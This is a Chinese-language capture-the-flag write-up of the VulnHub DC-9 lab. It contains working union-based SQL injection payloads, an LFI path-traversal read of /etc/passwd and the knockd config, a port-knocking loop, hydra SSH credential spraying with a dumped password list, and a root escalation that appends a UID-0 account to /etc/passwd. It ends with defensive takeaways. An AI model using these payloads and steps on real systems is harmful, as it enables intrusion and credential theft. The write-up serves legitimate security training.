# DC-9 靶機滲透測試紀錄

> [!info] **靶機基本資訊**
> - **平台**：VulnHub
> - **作業系統**：linux
> - **難易度**：easy
> - **開始時間**：2026-07-06

---

## 🔍 1. 偵察與列舉 (Reconnaissance & Enumeration)

### 🚀 快速連接埠掃描 (Nmap)
使用 Nmap 掃描目標 IP 上的開放服務與連接埠：
```bash
┌──(kali㉿kali)-[~/vulnhub/DC-9]
└─$ nmap -T4 -p- -A 10.6.6.12
```

**掃描結果整理：**

| 連接埠 (Port) | 服務 (Service) | 版本 (Version) | 備註 / 潛在漏洞點 |
| ---------- | ------------ | ------------ | ---------- |
| 22/tcp     | SSH          | filtered     | SSH 服務被防火牆過濾，可能需要 Port Knocking 觸發。 |
| 80/tcp     | HTTP         | Apache 2.4.38 | 網頁伺服器，本靶機的主要攻擊面。 |

---

### 🌐 網頁服務列舉 (Web Enumeration)
訪問網頁首頁 `http://10.6.6.12/`，網站主要功能為「Staff Details」員工查詢系統。

#### 1. SQL 注入點測試 (SQLi)
在搜尋框輸入單引號 `'` 測試，頁面直接爆出 SQL 語法錯誤，確認 `search` 參數存在 SQL 注入漏洞：
```http
POST /results.php HTTP/1.1
Host: 10.6.6.12
Content-Type: application/x-www-form-urlencoded

search='
```

#### 2. 目錄爆破與本地檔案包含 (LFI)
使用 `gobuster` 爆破網站目錄：
```bash
┌──(kali㉿kali)-[~/vulnhub/DC-9]
└─$ gobuster dir -u http://10.6.6.12/ -w /usr/share/wordlists/dirb/common.txt -x php
```
發現 `/manage.php` 頁面。訪問該頁面並測試 `file` 參數，確認存在本地檔案包含 (LFI) 漏洞，成功讀取 `/etc/passwd`：
```http
http://10.6.6.12/manage.php?file=../../../../../../../../../etc/passwd
```

---

### 📂 讀取 Knockd 配置 (Port Knocking Sequence)
利用 LFI 漏洞，讀取連接埠敲擊守護行程的設定檔 `/etc/knockd.conf`，以獲取開啟 SSH 的敲擊序列：
```http
http://10.6.6.12/manage.php?file=../../../../../../../../../etc/knockd.conf
```

**取得的配置內容：**
```text
[options]
	UseSyslog

[openSSH]
	sequence    = 7469,8475,9842
	seq_timeout = 25
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn

[closeSSH]
	sequence    = 9842,8475,7469
	seq_timeout = 25
	command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn
```
- 開啟 SSH 的敲擊序列為：**`7469, 8475, 9842`** (TCP)。
- 關閉 SSH 的敲擊序列為：**`9842, 8475, 7469`** (TCP)。

---

## ⚡ 2. 漏洞分析與初始存取 (Vulnerability Analysis & Initial Access)

### 🕵️ 漏洞分析 (Vulnerability Assessment)
1. **Union-based SQLi 欄位數判定**：
   在搜尋請求中遞增測試欄位，判定原 SQL 查詢返回的欄位數為 **6**：
   ```text
   ' UNION SELECT 1,2,3,4,5,6 -- -
   ```
2. **資料庫跨庫列舉**：
   - 獲取當前資料庫名（取得結果為 `Staff`）：
     ```text
     ' UNION SELECT 1,2,3,4,5,database() -- -
     ```
   - 獲取所有的資料庫名（發現另有包含憑證的 `users` 庫）：
     ```text
     ' UNION SELECT 1,group_concat(schema_name),3,4,5,6 FROM information_schema.schemata -- -
     ```
   - 列出 `users` 資料庫中的資料表（發現 `UserDetails` 表）：
     ```text
     ' UNION SELECT 1,group_concat(table_name),3,4,5,6 FROM information_schema.tables WHERE table_schema='users' -- -
     ```
   - 列出 `UserDetails` 中的欄位名（發現 `username` 與 `password`）：
     ```text
     ' UNION SELECT 1,group_concat(column_name),3,4,5,6 FROM information_schema.columns WHERE table_name='UserDetails' -- -
     ```
   - 導出所有帳號與純文字密碼：
     ```text
     ' UNION SELECT id,firstname,lastname,username,password,6 FROM users.UserDetails -- -
     ```
     **導出的憑證清單：**
     *   `marym:3kfs86sfd`
     *   `julied:468sfdfsd2`
     *   `fredf:4sfd87sfd1`
     *   `barneyr:RocksOff`
     *   `tomc:TC&TheBoyz`
     *   `jerrym:B8m#48sd`
     *   `wilmaf:Pebbles`
     *   `bettyr:BamBam01`
     *   `chandlerb:UrAG0D!`
     *   `joeyt:Passw0rd`
     *   `rachelg:yN72#dsd`
     *   `rossg:ILoveRachel`
     *   `monicag:3248dsds7s`
     *   `phoebeb:smellycats`
     *   `scoots:YR3BVxxxw87`
     *   `janitor:Ilovepeepee`
     *   `janitor2:Hawaii-Five-0`

---

### 🔑 初始存取突破 (Exploitation)

#### 1. 執行連接埠敲擊開啟 SSH
使用 Nmap 掃描發送 TCP SYN 封包，按順序敲擊該三個連接埠以開啟 22 埠：
```bash
┌──(kali㉿kali)-[~/vulnhub/DC-9]
└─$ for port in 7469 8475 9842 ; do nmap -Pn --max-retries 0 -p$port 10.6.6.12 ; done
```
敲擊後重新掃描確認 SSH Port 22 狀態，顯示已變為 `open`：
```bash
┌──(kali㉿kali)-[~/vulnhub/DC-9]
└─$ nmap -p 22 10.6.6.12
PORT   STATE SERVICE
22/tcp open  ssh
```

#### 2. SSH 憑證噴灑 (Credential Spraying)
將先前 SQLi 導出的帳號存入 `usernames.txt`，密碼存入 `passwords.txt`。使用 `hydra` 進行 SSH 憑證噴灑：
```bash
┌──(kali㉿kali)-[~/vulnhub/DC-9]
└─$ hydra -L usernames.txt -P passwords.txt ssh://10.6.6.12 -t 4
```
**成功噴灑出三個有效帳號：**
- `janitor:Ilovepeepee`
- `joeyt:Passw0rd`
- `chandlerb:UrAG0D!`

使用 `janitor` 帳密成功透過 SSH 登入系統：
```bash
┌──(kali㉿kali)-[~/vulnhub/DC-9]
└─$ ssh janitor@10.6.6.12
```

#### 3. 橫向移動 (janitor -> fredf)
登入 `janitor` 後，對系統檔案進行列舉。在其家目錄下的隱藏資料夾中發現了另一個密碼檔：
```bash
janitor@dc-9:~$ cat /home/janitor/.secrets-for-putin/passwords-found-on-post-it-notes.txt
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```
將這批新發現的密碼加入 `passwords.txt` 字典檔中，再度使用 `hydra` 針對 `usernames.txt` 進行 SSH 爆破：
```bash
┌──(kali㉿kali)-[~/vulnhub/DC-9]
└─$ hydra -L usernames.txt -P passwords.txt ssh://10.6.6.12 -t 4
```
**取得另一位使用者的憑證：**
- `fredf:B4-Tru3-001`

使用 SSH 登入為 `fredf` 使用者：
```bash
┌──(kali㉿kali)-[~/vulnhub/DC-9]
└─$ ssh fredf@10.6.6.12
```

---

## 📈 3. 特權提升 (Privilege Escalation)

### 🕵️ 本地資訊收集 (Local Enumeration)
登入 `fredf` 帳號後，執行 `sudo -l` 檢視所擁有的特權指令：
```bash
fredf@dc-9:~$ sudo -l
Matching Defaults entries for fredf on dc-9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test
```
*   `fredf` 可免密碼以 root 權限執行 `/opt/devstuff/dist/test/test`。
*   審查該路徑下的程式，發現該二進制程式是由 `/opt/devstuff/test.py` Python 腳本編譯而成。
*   此程式接收兩個參數：`[read_file_path] [append_file_path]`。功能為將前者的內容追加寫入至後者。
*   因為是以 root 權限執行此檔案，我們可以利用這個追加寫入的功能，將自定義的特權使用者資訊追加到系統的 `/etc/passwd` 中。

---

### 👑 提權利用 (Exploitation to Root / SYSTEM)

#### 1. 生成偽造的 root 使用者密碼 Hash
在攻擊機或靶機本地生成一個 MD5-crypt 加密密碼 Hash（此處設密碼為 `password`）：
```bash
fredf@dc-9:~$ openssl passwd -1 password
$1$J173o49o$0iIPz1r.UDdFjctdgrwIq0
```

#### 2. 建立偽造的使用者紀錄
建立臨時檔案 `/tmp/add-me`，寫入自訂的特權帳號 `pwned`，將 UID/GID 設為 0，家目錄設為 `/root`，Shell 為 `/bin/bash`：
```bash
fredf@dc-9:~$ echo 'pwned:$1$J173o49o$0iIPz1r.UDdFjctdgrwIq0:0:0:root:/root:/bin/bash' > /tmp/add-me
```

#### 3. 追加寫入至 /etc/passwd
利用 `/opt/devstuff/dist/test/test` 將 `/tmp/add-me` 追加至 `/etc/passwd`：
```bash
fredf@dc-9:~$ sudo /opt/devstuff/dist/test/test /tmp/add-me /etc/passwd
```

#### 4. 切換帳號取得 Root
使用 `su pwned`，並輸入密碼 `password`，成功取得最高權限：
```bash
fredf@dc-9:~$ su pwned
Password: 
root@dc-9:/home/fredf# id
uid=0(root) gid=0(root) groups=0(root)
root@dc-9:/home/fredf# cd /root
root@dc-9:~# cat theflag.txt
```
成功取得 Flag，滲透測試完成。

---

## 💡 4. 心得與學習點 (Key Takeaways)

1. **SQL 注入防禦**：開發查詢功能時，必須使用參數化查詢（Prepared Statements），以徹底防範 Union-based SQLi 導致的敏感資料外洩。
2. **客製化自動化腳本的安全漏洞**：在使用 `sudoers` 檔案授權普通使用者以 root 身分執行二進制檔案或腳本時，必須非常小心。任何具備讀取/寫入檔案（特別是像本例中任意檔案追加）或呼叫系統命令功能的程式，都極易演變成提權向量。應嚴禁給予此類程式 sudo 權限。
3. **密碼重用與複雜度原則**：系統多個使用者帳號密碼與資料庫內的員工密碼相同，導致了嚴重的憑證噴灑攻擊（Credential Spraying）。系統應實施強密碼策略並禁止在不同服務間重用密碼。
4. **資訊洩漏**：不應將敏感密碼純文字寫在系統內部的隨手記隱藏檔案中，一旦初始帳號被突破，這些資訊將直接導致橫向移動的連鎖效應。
